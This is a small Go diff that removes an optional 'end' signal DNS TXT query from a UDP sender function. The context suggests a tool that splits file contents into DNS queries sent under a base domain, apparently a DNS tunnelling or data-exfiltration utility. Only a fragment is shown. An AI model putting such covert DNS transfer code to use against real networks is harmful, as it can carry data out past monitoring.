@@ -104,16 +104,6 @@ func udpSender(dnsQueryGenerator func(string) ([][]byte, error), message string)
 
 		fmt.Printf("Sent query for: %d.\n", i)
 	}
-
-	// Optionally send a final "end" signal packet
-	endSignalDomain := fmt.Sprintf("end.%d.%s", len(dnsQueries), BASE_DOMAIN)
-	endPacket, _ := generateDNSTXTQuery(endSignalDomain)
-	if endPacket != nil {
-		_, err = conn.Write(endPacket)
-		if err == nil {
-			fmt.Printf("Sent end signal: %s\n", endSignalDomain)
-		}
-	}
 }
 
 func readFileToString() (string, error) {
